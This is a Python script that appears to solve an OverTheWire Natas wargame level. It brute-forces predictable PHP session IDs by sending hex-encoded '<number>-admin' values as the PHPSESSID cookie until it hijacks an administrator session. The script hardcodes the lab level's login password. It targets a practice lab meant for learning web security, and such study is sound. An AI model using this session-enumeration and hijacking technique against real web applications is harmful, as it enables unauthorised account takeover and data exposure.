# pylint: disable=no-member
import requests

print("Working...")
for i in range(1, 641):
  decodedCookie = str(i)+"-admin"
  r = requests.get(
    'http://natas19.natas.labs.overthewire.org', 
    auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'),
    cookies={"PHPSESSID" : decodedCookie.encode("utf-8").hex()}
  )
  if "regular user" not in r.text:
    print("\nSuccess!")
    print("User " + decodedCookie + " is an admin.")
    print("\nOutput:\n")
    print(r.content)
    break
  


